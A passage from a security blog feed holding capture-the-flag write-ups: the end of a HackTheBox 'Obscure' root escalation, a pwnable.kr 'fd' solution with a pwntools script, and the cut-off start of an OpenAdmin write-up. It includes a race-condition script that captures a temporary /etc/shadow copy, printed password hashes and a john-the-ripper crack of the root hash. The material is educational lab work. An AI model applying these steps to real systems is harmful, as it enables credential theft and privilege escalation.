class="variable">$qpePkxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc6RAj</span>/</span><br><span class="line">111111</span><br><span class="line">0</span><br><span class="line">111111</span><br><span class="line">1</span><br></pre></td></tr></table></figure></li><li><p>Check if username exist, if username don’t exist the temp file get removed and the script exit.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> passwords:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p[<span class="number">0</span>] == session[<span class="string">'user'</span>]:</span><br><span class="line">            salt, realPass = p[<span class="number">1</span>].split(<span class="string">'$'</span>)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> salt == <span class="string">""</span>:</span><br><span class="line">        print(<span class="string">"Invalid user"</span>)</span><br><span class="line">        os.remove(<span class="string">'/tmp/SSH/'</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li><li><p>If the username exist, the password get hashed and compared to the hash in the temp file (coming from <code>/etc/shadow</code> ) to see if they match. In the end the temp file get removed wether the password was correct or not. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">salt = <span class="string">'$6$'</span>+salt+<span class="string">'$'</span></span><br><span class="line"></span><br><span class="line">    realPass = salt + realPass</span><br><span class="line">    </span><br><span class="line">    hash = crypt.crypt(passW, salt)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> hash == realPass:</span><br><span class="line">        print(<span class="string">"Authed!"</span>)</span><br><span class="line">        session[<span class="string">'authenticated'</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Incorrect pass"</span>)</span><br><span class="line">        os.remove(<span class="string">'/tmp/SSH/'</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    os.remove(os.path.join(<span class="string">'/tmp/SSH/'</span>,path))</span><br></pre></td></tr></table></figure></li><li><p>If the password if also correct we get dropped in a “pseudo” shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> session[<span class="string">'authenticated'</span>] == <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = input(session[<span class="string">'user'</span>] + <span class="string">"@Obscure$ "</span>)</span><br><span class="line">        cmd = [<span class="string">'sudo'</span>, <span class="string">'-u'</span>,  session[<span class="string">'user'</span>]]</span><br><span class="line">        cmd.extend(command.split(<span class="string">" "</span>))</span><br><span class="line">        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    </span><br><span class="line">        o,e = proc.communicate()</span><br><span class="line">        print(<span class="string">'Output: '</span> + o.decode(<span class="string">'ascii'</span>))</span><br><span class="line">        print(<span class="string">'Error: '</span>  + e.decode(<span class="string">'ascii'</span>)) <span class="keyword">if</span> len(e.decode(<span class="string">'ascii'</span>)) &gt; <span class="number">0</span> <span class="keyword">else</span> print(<span class="string">''</span>)</span><br></pre></td></tr></table></figure></li></ol><p>Alright! So with all of this in mind, what can of flaw can we find in that ? </p><p>First thing that came to my mind was to edit the script to display the retrieved root hash. But of course it can not be that easy, we don’t have write rights since the file is owned by <code>root</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:~/BetterSSH$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rwxr-xr-x 1 root root 1805 Oct  5 13:09 BetterSSH.py</span><br></pre></td></tr></table></figure><p>Then what? The temporary file catch the attention aswell… If we manage to read it before it get deleted, we could retrieve <code>root</code> user password hash. We are facing two issues here:</p><ol><li><p>The file name is random.</p></li><li><p>The file get deleted immediately after creation. The script allow no “pause” where we could read the file before it gets deleted.</p></li></ol><p>At this point we will need to write a script monitoring the <code>/tmp/SSH/</code> folder for any file creation and grab it’s content as fast as possible before it get deleted.</p><p>To do so, I wrote a simple script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path = <span class="string">"/tmp/SSH/"</span></span><br><span class="line"></span><br><span class="line">before = dict([(file, <span class="literal">None</span>) <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    after = dict([(file, <span class="literal">None</span>) <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path)])</span><br><span class="line">    added = [file <span class="keyword">for</span> file <span class="keyword">in</span> after <span class="keyword">if</span> file <span class="keyword">not</span> <span class="keyword">in</span> before]</span><br><span class="line">    <span class="keyword">if</span> added:</span><br><span class="line">        <span class="keyword">with</span> open(path + added[<span class="number">0</span>], <span class="string">'r'</span>) <span class="keyword">as</span> new_file:</span><br><span class="line">            print(new_file.read())</span><br><span class="line">    before = after</span><br></pre></td></tr></table></figure><p>Basically the script will loop forever while listing file in <code>/tmp/SSH/</code>, if a new file is detected it will print its content.</p><p>Let’s drop it on the server and give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:/$ python3 /tmp/watch_ssh.py</span><br></pre></td></tr></table></figure><p>In another shell let’s run the <code>betterSSH.py</code> script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span><br><span class="line">Enter username: hg8</span><br><span class="line">Enter password: hg8</span><br><span class="line">Invalid user</span><br></pre></td></tr></table></figure><p>Going back to our script we can see it worked!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">robert@obscure:/$ python3 /tmp/watch_ssh.py</span><br><span class="line">root</span><br><span class="line"><span class="variable">$6</span><span class="variable">$riekpK4m</span><span class="variable">$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1</span></span><br><span class="line">18226</span><br><span class="line">0</span><br><span class="line">99999</span><br><span class="line">7</span><br><span class="line"></span><br><span class="line">robert</span><br><span class="line"><span class="variable">$6</span><span class="variable">$fZZcDG7g</span><span class="variable">$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU</span>.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/</span><br><span class="line">18163</span><br><span class="line">0</span><br><span class="line">99999</span><br><span class="line">7</span><br></pre></td></tr></table></figure><h3 id="Cracking-Root-password-hash"><a href="#Cracking-Root-password-hash" class="headerlink" title="Cracking Root password hash"></a>Cracking Root password hash</h3><p>Now that we have the hash let’s hope it can be cracked. I will use john the ripper</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"<span class="variable">$6</span><span class="variable">$fZZcDG7g</span><span class="variable">$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU</span>.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/"</span> &gt; roothash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt roothash</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">mercedes         (?)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Alright! We have the root password, let’s try to use it with the <code>betterSSH.py</code> script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span><br><span class="line">Enter username: root</span><br><span class="line">Enter password: mercedes</span><br><span class="line">Authed!</span><br><span class="line">root@Obscure$ cat /root/root.txt</span><br><span class="line">Output: 5xxxxxxxxxxxxxxxxxxxxxxxxx3</span><br></pre></td></tr></table></figure><hr><p>As always do not hesitate to contact me for any questions or feedbacks.</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> re </tag>
            
            <tag> python </tag>
            
            <tag> obscurity </tag>
            
            <tag> custom-exploitation </tag>
            
            <tag> encryption </tag>
            
            <tag> john </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.kr - FD</title>
      <link href="/posts/pwnable/fd/"/>
      <url>/posts/pwnable/fd/</url>
      
        <content type="html"><![CDATA[<p><img src="https://user-images.githubusercontent.com/9076747/82187694-12e6ad00-98ed-11ea-88da-0c05f6fcb13f.png" alt="fd"></p><p>One of my objective in 2020 is to level up in Reverse Engineering. Since I am starting from zero I got few people recommend <a href="http://pwnable.kr" target="_blank" rel="noopener">http://pwnable.kr</a> which appear to have a reasonable curve of difficulty making it ideal for learning. </p><p>If you have other recommandations for good ressources to learn and practices Reverse Engineering feels free to let me know below in a comment or <a href="https://hg8.sh/about/">contact me</a> ;)</p><p>That being said, here is my write-up for the first challenge of pwnable.kr: FD. </p><p>Let’s go!</p><hr><h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><blockquote><p><strong>FD</strong></p><p>Mommy! what is a file descriptor in Linux?<br>ssh <a href="mailto:fd@pwnable.kr">fd@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><p>This gives us an SSH access to a box with a hint that this challenge is going to be about File Descriptor</p><h2 id="File-Descriptor"><a href="#File-Descriptor" class="headerlink" title="File Descriptor"></a>File Descriptor</h2><p>In Unix a file descriptor is abstract indicator (handle) used to access a file or other input/output resource. A file descriptor is a non-negative integer, generally represented in the C programming language as the type int.</p><p>You are surely familiar with the three most common file descriptor:</p><ul><li>0 - stdin (Standard Input)</li><li>1 -  stdout (Standard Output)</li><li>2 - stderr (Standard Error)</li></ul><p>But file descriptor goes farther than that. To make it simple, file descriptor are used when you open a file.<br>When you do so, the OS will store the information about this file in a table entry. Theses table entries are represented with integers. The entry number is the file descriptor. </p><h2 id="Source-Code-Analysis"><a href="#Source-Code-Analysis" class="headerlink" title="Source Code Analysis"></a>Source Code Analysis</h2><p>The first thing we notice when connecting to the box is that code source of the challenge is available:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh fd@pwnable.kr -p2222</span><br><span class="line">fd@pwnable.kr<span class="string">'s password:</span></span><br><span class="line"><span class="string"> ____  __    __  ____    ____  ____   _        ___      __  _  ____</span></span><br><span class="line"><span class="string">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \</span></span><br><span class="line"><span class="string">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  '</span> / |  D  )</span><br><span class="line">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /</span><br><span class="line">|  |  |  `  <span class="string">'  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \</span></span><br><span class="line"><span class="string">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span></span><br><span class="line"><span class="string">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sun May  3 10:21:23 2020 from 93.172.62.192</span></span><br><span class="line"><span class="string">fd@pwnable:~$ ls -l</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span></span><br><span class="line"><span class="string">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span></span><br></pre></td></tr></table></figure><p>Let’s a take a look to understand what it’s doing:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = <span class="built_in">read</span>(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s break things down. The first information we get is that the app need an extra arguments in a form of a number:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>With the name of the challenge we can guess that is number will probably be a file descriptor. </p><p>Next we -almost- have a confirmation of this theory. <code>0x1234</code> (<code>4660</code>) gets subtracted to integer we passed as argument to get the actual file descriptor:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br></pre></td></tr></table></figure><p><em>Note: Here is a quick way to convert hexadecimal to decimal: <code>echo $((16#1234))</code></em></p><p>Then the <code>read</code> function is used to, well, read the file pointed by the file descriptor and store the content in the <code>buf</code> variable:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len = <span class="built_in">read</span>(fd, buf, <span class="number">32</span>);</span><br></pre></td></tr></table></figure><p>The <code>buf</code> variable gets check to see if it contains the string <code>LETMEWIN\n</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br></pre></td></tr></table></figure><p>If it does, then the program print out the flag:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">    system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>But you might wonder own the binary get print the flag since it’s owned by <code>root</code> ? It’s because the binary have the SUID bit set:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ls -l fd</span><br><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">   ^</span><br></pre></td></tr></table></figure><p>As a reminder:</p><blockquote><p>setuidis is a Unix access rights flag that allow users to run an executable with the permissions of the executable’s owner. They are often used to allow users to run programs with temporarily elevated privileges in order to perform a specific task. </p></blockquote><p>Thanks to this bit, the <code>fd</code> binary will run as with <code>root</code> privileges and will be allow to access the flag file.</p><p>Alright I think we now have all the needed informations to get the flag right ? To summarize:</p><ol><li>Create a file containing <code>LETMEWIN\n</code></li><li>Get the file descriptor of this file</li><li>Subtract <code>4660</code> from this file descriptor</li><li>Use this result as a command line argument: <code>./fd xxx</code></li></ol><p>Doesn’t look that scary. Let’s put it in practice now :) </p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>First, we create our file. Let’s use <code>printf</code> to make sure the newline gets included:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ <span class="built_in">printf</span> <span class="string">"LETMEWIN\n"</span> &gt; /tmp/.hg8</span><br><span class="line">fd@pwnable:~$ cat -e /tmp/.hg8</span><br><span class="line">LETMEWIN$</span><br></pre></td></tr></table></figure><p>Then we need to assign a file descriptor to our newly created file. It’s possible to do so using <code>exec X &lt; filename</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ <span class="built_in">exec</span> 10&lt;/tmp/.hg8</span><br></pre></td></tr></table></figure><p>Final step is to add <code>4660</code> to the file descriptor we chose and pass it as a argument to the <code>fd</code> binary:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4670</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><h3 id="Method-2-Recommended"><a href="#Method-2-Recommended" class="headerlink" title="Method 2 (Recommended)"></a>Method 2 (Recommended)</h3><p>We also know that one of the most common file descriptor is <code>0</code> which correspond to the standard input. If we use <code>4660</code> as an argument, the binary will compare <code>LETMEWIN\n</code> to the content in the file descriptor <code>0</code> which is the standard input. If everything goes fine we should be able to directly write our “secret” code there. </p><p>Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4660</span><br></pre></td></tr></table></figure><p>We get a blank line with no error messages, let’s type <code>LETMEWIN</code> then enter:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><h2 id="Exploitation-with-pwntools"><a href="#Exploitation-with-pwntools" class="headerlink" title="Exploitation with pwntools"></a>Exploitation with pwntools</h2><p>A simple challenge like this one is a good occasion to try our hand on <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><code>pwntools</code></a> which can probably comes very useful in the future.</p><blockquote><p>Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.</p></blockquote><p>After installing the tool let’s create a simple script to solve the challenge. </p><p>First let’s connect to the server:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">server = ssh(<span class="string">'fd'</span>, <span class="string">'pwnable.kr'</span>, <span class="number">2222</span>, <span class="string">'guest'</span>)</span><br></pre></td></tr></table></figure><p>Pop a shell and run <code>./fd</code> process with <code>4660</code> as argument, and then send the <code>LETMEIN</code> secret:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell = server.process([<span class="string">'./fd'</span>, str(<span class="number">4660</span>)])</span><br><span class="line">shell.sendline(<span class="string">'LETMEWIN'</span>)</span><br></pre></td></tr></table></figure><p>After closing the connection and printing the result the final script looks like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">server = ssh(<span class="string">'fd'</span>, <span class="string">'pwnable.kr'</span>, <span class="number">2222</span>, <span class="string">'guest'</span>)</span><br><span class="line">shell = server.process([<span class="string">'./fd'</span>, str(<span class="number">4660</span>)])</span><br><span class="line">shell.sendline(<span class="string">'LETMEWIN'</span>)</span><br><span class="line">result = shell.recvall()</span><br><span class="line">shell.close()</span><br><span class="line">server.close()</span><br><span class="line"></span><br><span class="line">print(result.decode(<span class="string">"utf-8"</span>))</span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py</span><br><span class="line">[+] Connecting to pwnable.kr on port 2222: Done</span><br><span class="line">[*] fd@pwnable.kr:</span><br><span class="line">    Distro    Ubuntu 16.04</span><br><span class="line">    OS:       linux</span><br><span class="line">    Arch:     amd64</span><br><span class="line">    Version:  4.4.179</span><br><span class="line">    ASLR:     Enabled</span><br><span class="line">[+] Starting remote process <span class="string">'./fd'</span> on pwnable.kr: pid 266951</span><br><span class="line">[+] Receiving all data: Done (62B)</span><br><span class="line">[*] Stopped remote process <span class="string">'fd'</span> on pwnable.kr (pid 266951)</span><br><span class="line">[*] Closed connection to <span class="string">'pwnable.kr'</span></span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwnable </category>
          
          <category> Toddler&#39;s Bottle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> fd </tag>
            
            <tag> file descriptor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - OpenAdmin</title>
      <link href="/posts/openadmin/"/>
      <url>/posts/openadmin/</url>
      
        <content type="html"><![CDATA[<img width="585" alt="openadmin-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158541-eef18000-9888-11ea-92ce-95a28fbd9c8d.png"><p>OpenAdmin is an easy Linux based box, it need a bit of exploit, lot of recon, pivot and a bit GTFObins to finish, nice combo right? While this box is rated easy I wouldn’t recommend it for beginners since it require a lot a recon, it’s easy to miss important information and can be very frustrating if you are not used to it.</p><p><strong>Tl;Dr:</strong> To get the user flag you had to exploit a Remote Code Execution exploit on an outdated <code>opennetadmin</code> instance. You get a shell as <code>www-data</code> from which you pivot to the <code>jimmy</code> user after finding his password in a database config file. From <code>jimmy</code> account you pivot again to <code>joanna</code> account by extracting her ssh private key using a php script since the Apache web server is configured to run as user <code>joanna</code> and we have write rights over the <code>Document Root</code> folder. Finally as <code>joanna</code> we can get the user flag.<br>The root flag was a bit less tricky and needed you to execute a shell from inside a privileged <code>nano</code>  that <code>joanna</code> is allowed to run as <code>root</code> without password.</p><p>Alright, let’s get into it!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.171 openadmin.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC openadmin.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> openadmin.htb (10.10.10.171)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.03 seconds</span><br></pre></td></tr></table></figure><p>We have the “classic”: A web app running on port 80 and the SSH port 22 open.</p><p>Opening <code>http://openadmin.htb/</code> display the Apache2 Ubuntu default page:</p><p><img src="https://user-images.githubusercontent.com/9076747/73017278-cd731100-3e1f-11ea-9b01-c07b9d816af3.png" alt="Apache2 Ubuntu default 